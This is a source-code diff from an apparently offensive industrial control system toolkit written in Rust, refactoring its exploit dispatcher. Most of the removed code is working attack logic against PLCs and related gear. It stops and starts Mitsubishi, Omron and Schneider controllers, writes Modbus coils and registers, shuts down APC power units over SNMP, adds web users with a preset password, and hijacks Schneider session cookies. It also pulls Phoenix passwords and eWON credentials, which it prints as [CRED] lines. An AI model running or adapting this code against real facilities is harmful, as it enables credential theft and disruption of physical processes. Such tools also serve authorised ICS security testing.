-        ("siemens", 6) => exploit_siemens_read_db(ip, port, input, &out),
-        ("schneider" | "modicon", 4) | ("modbus", 0) => exploit_modbus_map(ip, port, "quick", &out),
-        ("schneider" | "modicon", 5) | ("modbus", 1) => exploit_modbus_map(ip, port, "common", &out),
-        ("schneider" | "modicon", 6) | ("modbus", 2) => exploit_modbus_map(ip, port, input, &out),
-        ("schneider" | "modicon", 7) | ("modbus", 3) => exploit_modbus_map(ip, port, "all", &out),
-        ("schneider" | "modicon", 8) | ("modbus", 4) => exploit_modbus_holding(ip, port, input, &out),
-        ("schneider" | "modicon", 9) | ("modbus", 5) => exploit_modbus_coils(ip, port, input, &out),
-        ("schneider" | "modicon", 10) | ("modbus", 6) => exploit_modbus_input(ip, port, input, &out),
-        ("schneider" | "modicon", 11) | ("modbus", 7) => exploit_modbus_discrete(ip, port, input, &out),
-        ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, port, input, &out),
-        ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, port, input, &out),
-        ("mitsubishi", 3) => exploit_slmp_map(ip, port, input, &out),
-        ("mitsubishi", 4) => exploit_slmp_map(ip, port, "all", &out),
-        ("mitsubishi", 5) => exploit_mitsubishi_state(ip, "run", &out),
-        ("mitsubishi", 6) => exploit_mitsubishi_state(ip, "stop", &out),
-        ("mitsubishi", 7) => exploit_mitsubishi_set_pause(ip, &out),
-        ("mitsubishi", 8) => exploit_mitsubishi_read_d(ip, port, input, &out),
-        ("mitsubishi", 9) => exploit_mitsubishi_read_m(ip, port, input, &out),
-        ("mitsubishi", 10) => exploit_slmp_write_d(ip, port, input, &out),
-        ("mitsubishi", 11) => exploit_slmp_write_m(ip, port, input, &out),
-        ("siemens", 7) => exploit_siemens_write_db(ip, port, input, &out),
-        ("siemens", 8) => exploit_siemens_try_defaults(ip, port, &out),
-        ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, port, input, &out),
-        ("schneider" | "modicon", 12) | ("modbus", 8) => exploit_modbus_write_coil(ip, port, input, &out),
-        ("schneider" | "modicon", 13) | ("modbus", 9) => exploit_modbus_write_register(ip, port, input, &out),
-        ("schneider" | "modicon", 14) | ("modbus", 10) => {
-            exploit_modbus_write_registers(ip, port, input, &out);
-        }
-        ("schneider" | "modicon", 15) => exploit_fc90_stop(ip, port, &out),
-        ("schneider" | "modicon", 16) => exploit_fc90_start(ip, port, &out),
-        ("schneider" | "modicon", 17) => exploit_fc90_stop_tm221(ip, port, &out),
-        ("schneider" | "modicon", 18) => exploit_fc90_start_tm221(ip, port, &out),
-        ("schneider" | "modicon", 19) => exploit_fc90_force(ip, port, input, &out),
-        ("omron", 0) => exploit_omron_info(ip, port, &out),
-        ("omron", 1) => exploit_omron_read_dm(ip, port, input, &out),
-        ("omron", 2) => exploit_omron_write_dm(ip, port, input, &out),
-        ("omron", 3) => exploit_omron_cpu_status(ip, port, &out),
-        ("omron", 4) => exploit_omron_cpu_run(ip, port, &out),
-        ("omron", 5) => exploit_omron_cpu_stop(ip, port, &out),
-        ("iec104", 0) => exploit_iec104_gi(ip, port, &out),
-        ("iec104", 1) => exploit_iec104_sc_on(ip, port, input, &out),
-        ("iec104", 2) => exploit_iec104_sc_off(ip, port, input, &out),
-        ("iec104", 3) => exploit_iec104_dc(ip, port, input, &out),
-        ("snmp", 0) => exploit_snmp_sys_info(ip, port, input, &out),
-        ("snmp", 1) => exploit_snmp_interfaces(ip, port, input, &out),
-        ("snmp", 2) => exploit_snmp_topology(ip, port, input, &out),
-        ("snmp", 3) => exploit_snmp_community_scan(ip, port, &out),
-        ("snmp", 4) => exploit_snmp_cve_probe(ip, port, input, &out),
-        ("snmp", 5) => exploit_snmp_walk(ip, port, input, &out),
-        ("snmp", 6) => exploit_snmp_test_write(ip, port, input, &out),
-        ("snmp", 7) => exploit_snmp_apc_status(ip, port, input, &out),
-        ("snmp", 8) => exploit_snmp_apc_shutdown(ip, port, input, &out),
-        ("bacnet", 0) => {
-            use casket::vendors::bacnet::client as bacnet;
-            let timeout = std::time::Duration::from_secs(5);
-            if let Some(dev) = bacnet::scan_ip(ip, 5) {
-                out(&format!("Instance ID : {}", dev.instance_id));
-                out(&format!("Vendor      : {} (ID {})", dev.vendor_name, dev.vendor_id));
-                out(&format!("Object Name : {}", dev.object_name));
-                out(&format!("Description : {}", dev.description));
-                out(&format!("Firmware    : {}", dev.firmware_revision));
-                out(&format!("Max APDU    : {}", dev.max_apdu));
-            } else {
-                out("No BACnet device responded");
-            }
-            let _ = timeout; // suppress unused
-        }
-        ("bacnet", 1) => {
-            use casket::vendors::bacnet::client as bacnet;
-            let timeout = std::time::Duration::from_secs(5);
-            if let Some(dev) = bacnet::scan_ip(ip, 5) {
-                let prop_ids = [
-                    (bacnet::PROP_OBJECT_NAME, "Object-Name"),
-                    (bacnet::PROP_DESCRIPTION, "Description"),
-                    (bacnet::PROP_FIRMWARE_REVISION, "Firmware-Revision"),
-                    (bacnet::PROP_VENDOR_NAME, "Vendor-Name"),
-                    (bacnet::PROP_VENDOR_IDENTIFIER, "Vendor-Identifier"),
-                ];
-                for (prop_id, label) in prop_ids {
-                    if let Some(val) = bacnet::read_property(ip, dev.instance_id, prop_id, timeout) {
-                        out(&format!("{label}: {val}"));
-                    }
-                }
-            } else {
-                out("No BACnet device responded");
-            }
-        }
-        ("bacnet", 2) => {
-            use casket::vendors::bacnet::client as bacnet;
-            let timeout = std::time::Duration::from_secs(5);
-            let devices = bacnet::who_is_broadcast(timeout);
-            if devices.is_empty() {
-                out("No BACnet devices found on broadcast");
-            } else {
-                out(&format!("Found {} device(s):", devices.len()));
-                for dev in &devices {
-                    out(&format!("  {} — instance {} vendor_id {}", dev.ip, dev.instance_id, dev.vendor_id));
-                    if !dev.object_name.is_empty() {
-                        out(&format!("    Name: {}", dev.object_name));
-                    }
-                }
-            }
-        }
-        ("dnp3", 0) => {
-            use casket::vendors::dnp3::client as dnp3;
-            let timeout = std::time::Duration::from_secs(5);
-            let attrs = dnp3::read_device_attributes(ip, timeout);
-            if attrs.is_empty() {
-                out("No device attributes returned (device may not support group 0)");
-            } else {
-                let mut pairs: Vec<_> = attrs.iter().collect();
-                pairs.sort_by_key(|(k, _)| k.as_str());
-                for (k, v) in pairs {
-                    out(&format!("{k}: {v}"));
-                }
-            }
-        }
-        ("dnp3", 1) => {
-            use casket::vendors::dnp3::client as dnp3;
-            let timeout = std::time::Duration::from_secs(5);
-            let lines = dnp3::read_integrity_poll(ip, timeout);
-            if lines.is_empty() {
-                out("No integrity poll response received");
-            } else {
-                out(&format!("Received {} frame(s):", lines.len()));
-                for l in &lines { out(l); }
-            }
-        }
-        ("opcua", 0) => {
-            use casket::vendors::opcua::client as opcua;
-            let timeout = std::time::Duration::from_secs(5);
-            if let Some(server) = opcua::detect(ip, 4840, timeout) {
-                let endpoints = opcua::get_endpoints(ip, 4840, timeout);
-                out(&format!("IP          : {}", server.ip));
-                out(&format!("Port        : {}", server.port));
-                out(&format!("Endpoints   : {}", endpoints.len()));
-                let anon = endpoints.iter().any(|e| e.allows_anonymous && e.security_mode == "None");
-                out(&format!("Anon access : {}", if anon { "YES — unauthenticated access possible" } else { "No" }));
-                let modes: std::collections::HashSet<_> = endpoints.iter().map(|e| e.security_mode.as_str()).collect();
-                let mut modes_v: Vec<_> = modes.into_iter().collect();
-                modes_v.sort_unstable();
-                out(&format!("Sec modes   : {}", modes_v.join(", ")));
-            } else {
-                out("No OPC-UA server responded (port 4840)");
-            }
-        }
-        ("opcua", 1) => {
-            use casket::vendors::opcua::client as opcua;
-            let timeout = std::time::Duration::from_secs(5);
-            let endpoints = opcua::get_endpoints(ip, 4840, timeout);
-            if endpoints.is_empty() {
-                out("No endpoints returned — server may require a different port or security policy");
-            } else {
-                for (i, ep) in endpoints.iter().enumerate() {
-                    out(&format!("[{i}] {}", ep.url));
-                    out(&format!("    Security policy : {}", ep.security_policy));
-                    out(&format!("    Security mode   : {}", ep.security_mode));
-                    out(&format!("    Anonymous auth  : {}", ep.allows_anonymous));
-                }
-            }
-        }
-        ("opcua", 2) => {
-            use casket::vendors::opcua::client as opcua;
-            let timeout = std::time::Duration::from_secs(5);
-            let endpoints = opcua::get_endpoints(ip, 4840, timeout);
-            let vuln: Vec<_> = endpoints.iter()
-                .filter(|e| e.allows_anonymous && e.security_mode == "None")
-                .collect();
-            if vuln.is_empty() {
-                out("No None-security anonymous endpoints found");
-                out("All endpoints require authentication or encryption");
-            } else {
-                out(&format!("[VULN] Found {} anonymous endpoint(s):", vuln.len()));
-                for ep in &vuln {
-                    out(&format!("  [VULN] {}", ep.url));
-                    out("  Anonymous connect allowed with no encryption");
-                }
-            }
-        }
-        ("mqtt", 0) => {
-            let (topic, payload_str) = input.split_once(':').unwrap_or((input, ""));
-            let mqtt_port = if port == 0 {
-                casket::vendors::mqtt::client::MQTT_PORT
-            } else {
-                port
-            };
-            let opts = ConnectOptions {
-                host: ip.to_string(),
-                port: mqtt_port,
-                client_id: "scadaver-pub".to_string(),
-                ..Default::default()
-            };
-            out(&format!("Publishing to '{topic}' on {ip}:{mqtt_port}…"));
-            match MqttSession::connect(&opts)
-                .and_then(|mut sess| sess.publish(topic, payload_str.as_bytes(), 0, false))
-            {
-                Ok(()) => out(&format!("Published {} byte(s) to '{topic}'.", payload_str.len())),
-                Err(e) => out(&format!("Error: {e}")),
-            }
+            return;
         }
         ("mqtt", 1) => {
             let mqtt_port = if port == 0 {
@@ -2583,15 +2522,16 @@ fn dispatch_exploit(
                 client_id: "scadaver-scan".to_string(),
                 ..Default::default()
             };
-            out(&format!("Subscribing to all topics on {ip}:{mqtt_port} for 2 s…"));
+            out(&format!(
+                "Subscribing to all topics on {ip}:{mqtt_port} for 2 s…"
+            ));
             match MqttSession::connect(&opts).and_then(|mut sess| {
                 sess.subscribe("#", 0)?;
                 std::thread::sleep(std::time::Duration::from_secs(2));
                 Ok(sess.drain_messages())
             }) {
                 Ok(msgs) => {
-                    let mut topics: Vec<String> =
-                        msgs.iter().map(|m| m.topic.clone()).collect();
+                    let mut topics: Vec<String> = msgs.iter().map(|m| m.topic.clone()).collect();
                     topics.sort();
                     topics.dedup();
                     let leaves: Vec<(String, bool)> =
@@ -2609,609 +2549,48 @@ fn dispatch_exploit(
                 }
                 Err(e) => out(&format!("Error: {e}")),
             }
+            return;
         }
-        _ => {
-            // Auto-detect rescan: probe all protocols, emit DeviceFound
-            out(&format!("[*] Auto-detecting {ip}..."));
-            let all = probe_all(ip, 8);
-            match all.len() {
-                0 => out(&format!("[-] {ip}: no device identified")),
-                1 => {
-                    let info = all.into_iter().next().unwrap();
-                    out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
-                    let _ = tx.send(ScanEvent::DeviceFound(info));
-                }
-                _ => {
-                    let protocols: Vec<String> =
-                        all.iter().map(|d| d.vendor.clone()).collect();
-                    out(&format!("[+] {} \u{2192} MULTI ({})", ip, protocols.join(", ")));
-                    let mut fields: HashMap<String, Value> = HashMap::new();
-                    fields.insert(
-                        "protocols".into(),
-                        Value::Array(
-                            protocols.iter().map(|p| Value::String(p.clone())).collect(),
-                        ),
-                    );
-                    for d in all {
-                        let vf = serde_json::to_value(&d.fields).unwrap_or_default();
-                        fields.insert(d.vendor, vf);
-                    }
-                    let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
-                        vendor: "multi".into(),
-                        ip: ip.to_string(),
-                        fields,
-                    }));
-                }
+        _ => {}
+    }
+
+    // All other known actions delegate to the shared ops layer.
+    let action_id = format!("{vendor}/{idx}");
+    if !crate::ops::run_action(&action_id, ip, port, input, stored_password, &out) {
+        // Unknown action — auto-detect all protocols.
+        out(&format!("[*] Auto-detecting {ip}..."));
+        let all = probe_all(ip, 8);
+        match all.len() {
+            0 => out(&format!("[-] {ip}: no device identified")),
+            1 => {
+                let info = all.into_iter().next().unwrap();
+                out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
+                let _ = tx.send(ScanEvent::DeviceFound(info));
             }
-        }
-    }
-}
-
-fn exploit_beckhoff_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::{ads, scan};
-    let local_netid = ads::build_local_netid(&local_ip_for(ip));
-    out(&format!("[*] Discovering Beckhoff at {ip}..."));
-    match scan::discover_ip_with_port(ip, 3, true, port)
-        .ok()
-        .and_then(|mut v| {
-            if v.is_empty() {
-                None
-            } else {
-                Some(v.remove(0))
-            }
-        }) {
-        Some(dev) => {
-            let state = scan::get_state(&dev, &local_netid, port);
-            out(&format!("  State:   {state}"));
-            match scan::get_device_info_full(&dev, &local_netid, port) {
-                Some(info) => {
-                    out(&format!("  Name:    {}", info.name));
-                    out(&format!("  NetID:   {}", info.netid));
-                    out(&format!("  TwinCAT: {}", info.tc_version));
-                    if let Some(os) = &info.os_name {
-                        out(&format!("  OS:      {os}"));
-                    }
-                }
-                None => out("[-] Could not retrieve full device info"),
-            }
-        }
-        None => out("[-] No Beckhoff device responded"),
-    }
-}
-
-fn exploit_beckhoff_state(ip: &str, port: u16, state: &str, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::{ads, scan};
-    let local_netid = ads::build_local_netid(&local_ip_for(ip));
-    out(&format!("[*] Setting TwinCAT state to {state} on {ip}..."));
-    match scan::discover_ip_with_port(ip, 3, true, port)
-        .ok()
-        .and_then(|mut v| {
-            if v.is_empty() {
-                None
-            } else {
-                Some(v.remove(0))
-            }
-        }) {
-        Some(dev) => match scan::set_twincat_state(&dev, &local_netid, state, port) {
-            Ok(_) => out(&format!("[+] State command sent ({state})")),
-            Err(e) => out(&format!("[-] {e}")),
-        },
-        None => out("[-] No Beckhoff device responded"),
-    }
-}
-
-fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::webcontrol;
-    out(&format!("[*] Sending reboot to {ip}..."));
-    match webcontrol::reboot(ip, port) {
-        Ok(true) => out("[+] Reboot command sent"),
-        Ok(false) => out("[!] Sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_beckhoff_adduser(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::webcontrol;
-    let (uname, pass) = input.split_once(':').unwrap_or((input, "Sc4d4v3r!"));
-    out(&format!("[*] Adding user '{uname}' to {ip}..."));
-    match webcontrol::add_user(ip, port, uname, pass) {
-        Ok(true) => out("[+] User creation command sent"),
-        Ok(false) => out("[!] Sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-/// Look up a single string field from the stored device record. Used to retrieve
-/// per-device credentials (passwords, community strings) without threading them
-/// through every caller.
-fn device_field_str(ip: &str, key: &str) -> Option<String> {
-    let db = crate::db::Database::open(&crate::db::Database::default_path()).ok()?;
-    let devices = db.load_devices().ok()?;
-    let dev = devices.into_iter().find(|d| d.ip == ip)?;
-    dev.fields[key].as_str().map(str::to_string)
-}
-
-fn exploit_siemens_cpu(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let db_password = device_field_str(ip, "password");
-    let password: Option<&str> =
-        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
-    out(&format!("[*] Reading CPU state from {ip}:{port}..."));
-    let state = s7comm::get_cpu_state(ip, port, 5, password);
-    if state == "Unknown" {
-        if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
-        } else {
-            out("[-] Could not read CPU state");
-        }
-    } else {
-        out(&format!("  CPU State: {state}"));
-    }
-}
-
-fn exploit_siemens_io(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let db_password = device_field_str(ip, "password");
-    let password: Option<&str> =
-        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
-    out(&format!("[*] Reading I/O from {ip}:{port}..."));
-    let data = s7comm::read_all_data(ip, port, 5, password);
-    let [hdr, sep] = io_header();
-    let mut all_addrs: Vec<String> = Vec::new();
-    let mut all_vals: Vec<String> = Vec::new();
-    let mut has_any = false;
-
-    for (area, prefix) in &[("inputs", "I"), ("outputs", "Q"), ("merkers", "M")] {
-        let Some(Some(bits)) = data.get(*area) else {
-            continue;
-        };
-        let mut keys: Vec<&String> = bits.keys().collect();
-        keys.sort_by(|a, b| {
-            let parse = |s: &str| {
-                let (byte_s, bit_s) = s.split_once('.').unwrap_or((s, "0"));
-                (
-                    byte_s.parse::<u32>().unwrap_or(0),
-                    bit_s.parse::<u8>().unwrap_or(0),
-                )
-            };
-            parse(a).cmp(&parse(b))
-        });
-        out(&format!("  [{area}]"));
-        out(&hdr);
-        out(&sep);
-        for key in &keys {
-            let val = bits[*key];
-            let (byte_s, bit_s) = key.split_once('.').unwrap_or((key, "0"));
-            let addr = format!("{prefix}{byte_s}.{bit_s}");
-            out(&fmt_io_row(&addr, bit_s, val));
-            all_addrs.push(addr);
-            all_vals.push(if val != 0 {
-                "true".to_string()
-            } else {
-                "false".to_string()
-            });
-        }
-        out(&sep);
-        has_any = true;
-    }
-
-    if !has_any {
-        if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
-        } else {
-            out("[-] No I/O data received");
-        }
-        return;
-    }
-    let points: Vec<(&str, Option<&str>, &str)> = all_addrs
-        .iter()
-        .zip(all_vals.iter())
-        .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
-        .collect();
-    save_and_diff(ip, "s7", &points, out);
-}
-
-fn exploit_siemens_toggle(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let db_password = device_field_str(ip, "password");
-    let password: Option<&str> =
-        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
-    out(&format!("[*] Toggling CPU state on {ip}:{port}..."));
-    if s7comm::change_cpu_state(ip, port, 5) {
-        out(&format!(
-            "[+] New state: {}",
-            s7comm::get_cpu_state(ip, port, 5, password)
-        ));
-    } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
-    } else {
-        out("[-] Failed to toggle CPU state");
-    }
-}
-
-fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::flash_led;
-    out(&format!("[*] Flashing LED on {ip}..."));
-    match flash_led::flash_led_ip(ip) {
-        Ok(()) => out("[+] Flash LED command sent"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_schneider_hijack_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::session_hijack;
-    let username = if input.trim().is_empty() { "Administrator" } else { input.trim() };
-    out(&format!("[*] Getting session cookie from {ip}..."));
-    match session_hijack::get_session_cookie(ip, port) {
-        Some(s) => {
-            out(&format!("[+] Cookie:          {}", s.cookie_value));
-            out(&format!("    Power-on count:  {}", s.power_on_count));
-            if let Some(info) = session_hijack::get_device_info(ip, port, &s.cookie_value, username) {
-                out(&format!("    Device:          {}", info.device));
-                out(&format!("    MAC:             {}", info.mac));
-                out(&format!("    Firmware:        {}", info.firmware));
-                out(&format!("    State:           {}", info.state));
-            }
-        }
-        None => out("[-] Failed to get session cookie"),
-    }
-}
-
-fn exploit_schneider_action(ip: &str, port: u16, action: &str, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::session_hijack;
-    let username = if input.trim().is_empty() { "Administrator" } else { input.trim() };
-    out(&format!("[*] Getting session cookie from {ip}..."));
-    match session_hijack::get_session_cookie(ip, port) {
-        Some(s) => {
-            out(&format!("[+] Cookie: {}", s.cookie_value));
-            if session_hijack::control_plc(ip, port, &s.cookie_value, username, action) {
-                out(&format!("[+] PLC {action} command sent"));
-            } else {
-                out(&format!("[-] Failed to {action} PLC"));
-            }
-        }
-        None => out("[-] Failed to get session cookie"),
-    }
-}
-
-fn exploit_phoenix_passwords(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::phoenix::webvisit;
-    out(&format!("[*] Retrieving passwords from {ip}..."));
-    match webvisit::retrieve_passwords(ip, port) {
-        Ok(entries) => {
-            for e in &entries {
-                if let Some(p) = &e.password {
-                    out(&format!("  Level {}: {p}", e.user_level));
-                    out(&format!("[CRED] level{}:{p}", e.user_level));
-                } else if let Some(h) = &e.hash {
-                    out(&format!("  Level {} [sha256]: {h}", e.user_level));
-                }
-            }
-            out(&format!("[+] {} entry/entries found", entries.len()));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_phoenix_list_tags(ip: &str, port: u16, out: &impl Fn(&str)) -> Vec<String> {
-    use casket::vendors::phoenix::webvisit;
-    out(&format!("[*] Listing tags on {ip}..."));
-    match webvisit::get_tags(ip, port) {
-        Ok((project, tags)) => {
-            out(&format!("  Project: {project}"));
-            for (i, t) in tags.iter().enumerate() {
-                out(&format!("  [{i:>4}] {t}"));
-            }
-            out(&format!("[+] {} tag(s)", tags.len()));
-            tags
-        }
-        Err(e) => {
-            out(&format!("[-] {e}"));
-            vec![]
-        }
-    }
-}
-
-fn exploit_phoenix_read_tags(ip: &str, port: u16, out: &impl Fn(&str)) -> Vec<String> {
-    use casket::vendors::phoenix::webvisit;
-    out(&format!("[*] Reading tag values from {ip}..."));
-    match webvisit::get_tags(ip, port) {
-        Ok((_, tags)) => {
-            match webvisit::read_tag_values(ip, port, &tags) {
-                Ok(vals) => {
-                    for (name, val) in &vals {
-                        out(&format!("  {name}: {val}"));
-                    }
-                }
-                Err(e) => out(&format!("[-] {e}")),
-            }
-            tags
-        }
-        Err(e) => {
-            out(&format!("[-] {e}"));
-            vec![]
-        }
-    }
-}
-
-fn exploit_phoenix_write_tag(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::phoenix::webvisit;
-    let (tag_name, value) = input.split_once('=').unwrap_or((input, "0"));
-    out(&format!("[*] Writing {tag_name}={value} on {ip}..."));
-    match webvisit::write_tag_value(ip, port, tag_name, value) {
-        Ok(_) => out(&format!("[+] Wrote {tag_name} = {value}")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_phoenix_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::phoenix::control;
-    out(&format!("[*] Getting device info from {ip}..."));
-    match control::get_device_info(ip, port, false) {
-        Ok(info) => {
-            out(&format!("  PLC Type: {}", info.plc_type));
-            if let Some(fw) = info.firmware {
-                out(&format!("  Firmware: {fw}"));
-            }
-            if let Some(b) = info.build {
-                out(&format!("  Build:    {b}"));
-            }
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::ewon::exploit;
-    let (username, max_str) = if input.is_empty() {
-        ("adm", "20")
-    } else {
-        input.split_once(':').unwrap_or(("adm", "20"))
-    };
-    let max_users: u32 = max_str.trim().parse().unwrap_or(20);
-    out(&format!(
-        "[*] Extracting credentials from {ip} (user={username}, slots={max_users})..."
-    ));
-    let users = exploit::exploit(ip, port, username, max_users);
-    for u in &users {
-        out(&format!(
-            "  {} ({} {}): {}",
-            u.username, u.first_name, u.last_name, u.password
-        ));
-        if !u.access_rights.is_empty() {
-            out(&format!("    Access: {}", u.access_rights));
-        }
-        out(&format!("[CRED] {}:{}", u.username, u.password));
-    }
-    out(&format!("[+] {} user(s) extracted", users.len()));
-}
-
-fn exploit_rockwell_identity(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::rockwell::driver;
-    out(&format!("[*] Getting device identity from {ip}..."));
-    match driver::get_device_info(ip, port) {
-        Ok(dev) => {
-            out(&format!("  Vendor:       {}", dev.vendor));
-            out(&format!("  Product Type: {}", dev.product_type));
-            out(&format!("  Product Code: {}", dev.product_code));
-            out(&format!("  Product Name: {}", dev.product_name));
-            out(&format!("  Revision:     {}", dev.revision));
-            out(&format!("  Serial:       {}", dev.serial));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) -> Vec<(String, bool)> {
-    use casket::vendors::rockwell::driver;
-    use std::collections::HashMap;
-
-    let mut leaves_out: Vec<(String, bool)> = Vec::new();
-    out(&format!("[*] Enumerating tags on {ip}..."));
-    let tags = match driver::enumerate_tags(ip, port) {
-        Ok(t) => t,
-        Err(e) => {
-            out(&format!("[-] {e}"));
-            return leaves_out;
-        }
-    };
-    out(&format!(
-        "[*] {} tags found: downloading UDT templates and reading values...",
-        tags.len()
-    ));
-
-    // Download UDT templates for all struct-typed tags
-    let templates = driver::enumerate_templates(ip, port, &tags);
-
-    // Bulk-read all scalar (non-array, non-struct) tags in one session
-    let scalar_names: Vec<&str> = tags
-        .iter()
-        .filter(|t| !driver::is_struct_like(t.tag_type) && t.dimensions == 0)
-        .map(|t| t.name.as_str())
-        .collect();
-    let raw_values = driver::read_tags_bulk(ip, port, &scalar_names);
-    let value_map: HashMap<&str, String> = scalar_names
-        .iter()
-        .zip(raw_values.iter())
-        .map(|(&name, opt)| {
-            let val = match opt {
-                Some(data) => driver::decode_value(
-                    tags.iter()
-                        .find(|t| t.name == name)
-                        .map_or(0, |t| t.tag_type),
-                    data,
-                    Some(&templates),
-                ),
-                None => "-".to_string(),
-            };
-            (name, val)
-        })
-        .collect();
-
-    // Bulk-read element [0] for 1D non-struct arrays
-    let array1d_tags: Vec<(&str, u16)> = tags
-        .iter()
-        .filter(|t| !driver::is_struct_like(t.tag_type) && t.dimensions == 1)
-        .map(|t| (t.name.as_str(), t.tag_type))
-        .collect();
-    let array1d_subscript_names: Vec<String> = array1d_tags
-        .iter()
-        .map(|(name, _)| format!("{name}[0]"))
-        .collect();
-    let array1d_name_refs: Vec<&str> = array1d_subscript_names
-        .iter()
-        .map(String::as_str)
-        .collect();
-    let array1d_raw = driver::read_tags_bulk(ip, port, &array1d_name_refs);
-    let array1d_map: HashMap<&str, String> = array1d_tags
-        .iter()
-        .zip(array1d_raw.iter())
-        .map(|((name, tag_type), opt)| {
-            let val = match opt {
-                Some(data) => format!("[{}, ...]", driver::decode_value(*tag_type, data, Some(&templates))),
-                None => "[array]".to_string(),
-            };
-            (*name, val)
-        })
-        .collect();
-
-    // Bulk-read element [0] for 1D arrays-of-structs
-    let array1d_struct_tags: Vec<(&str, u16)> = tags
-        .iter()
-        .filter(|t| driver::is_struct_like(t.tag_type) && t.dimensions == 1)
-        .map(|t| (t.name.as_str(), t.tag_type))
-        .collect();
-    let array1d_struct_subs: Vec<String> = array1d_struct_tags
-        .iter()
-        .map(|(name, _)| format!("{name}[0]"))
-        .collect();
-    let array1d_struct_refs: Vec<&str> =
-        array1d_struct_subs.iter().map(String::as_str).collect();
-    let array1d_struct_raw = driver::read_tags_bulk(ip, port, &array1d_struct_refs);
-    let array1d_struct_map: HashMap<&str, String> = array1d_struct_tags
-        .iter()
-        .zip(array1d_struct_raw.iter())
-        .map(|((name, tag_type), opt)| {
-            let val = opt.as_deref().map_or_else(
-                || "[array]".to_string(),
-                |data| {
-                    format!(
-                        "[{}, ...]",
-                        driver::decode_value(*tag_type, data, Some(&templates))
-                    )
-                },
-            );
-            (*name, val)
-        })
-        .collect();
-
-    // Bulk-read scalar struct tags — keep raw bytes for flatten_struct expansion
-    let struct_tags: Vec<(&str, u16)> = tags
-        .iter()
-        .filter(|t| driver::is_struct_like(t.tag_type) && t.dimensions == 0)
-        .map(|t| (t.name.as_str(), t.tag_type))
-        .collect();
-    let struct_names: Vec<&str> = struct_tags.iter().map(|(n, _)| *n).collect();
-    let struct_raw = driver::read_tags_bulk(ip, port, &struct_names);
-    let struct_raw_map: HashMap<&str, Vec<u8>> = struct_tags
-        .iter()
-        .zip(struct_raw.iter())
-        .filter_map(|((name, _), opt)| opt.as_ref().map(|data| (*name, data.clone())))
-        .collect();
-
-    let [hdr, sep] = tag_header();
-    out(&hdr);
-    out(&sep);
-    for t in &tags {
-        let (base, dims) = driver::type_parts(t.tag_type);
-        if driver::is_struct_like(t.tag_type) && t.dimensions == 0 {
-            let template_id = t.tag_type & 0x0FFF;
-            if let Some(raw) = struct_raw_map.get(t.name.as_str()) {
-                let body = driver::struct_body(raw);
-                let leaves = driver::flatten_struct(body, template_id, Some(&templates));
-                if leaves.is_empty() {
-                    out(&fmt_tag_row(
-                        i64::from(t.instance_id),
-                        &t.name,
-                        &base,
-                        dims,
-                        &driver::type_name(t.tag_type),
-                        i64::from(t.tag_type),
-                    ));
-                } else {
-                    out(&fmt_tag_row(
-                        i64::from(t.instance_id),
-                        &t.name,
-                        &base,
-                        dims,
-                        "",
-                        i64::from(t.tag_type),
-                    ));
-                    let pad = leaves
-                        .iter()
-                        .map(|l| l.path.len() + 1)
-                        .max()
-                        .unwrap_or(10);
-                    for leaf in &leaves {
-                        out(&fmt_leaf_row(&format!(".{}", leaf.path), &leaf.value, pad));
-                        leaves_out.push((format!("{}.{}", t.name, leaf.path), leaf.writable));
-                    }
-                }
-            } else {
-                out(&fmt_tag_row(
-                    i64::from(t.instance_id),
-                    &t.name,
-                    &base,
-                    dims,
-                    &driver::type_name(t.tag_type),
-                    i64::from(t.tag_type),
+            _ => {
+                let protocols: Vec<String> = all.iter().map(|d| d.vendor.clone()).collect();
+                out(&format!(
+                    "[+] {} \u{2192} MULTI ({})",
+                    ip,
+                    protocols.join(", ")
                 ));
-            }
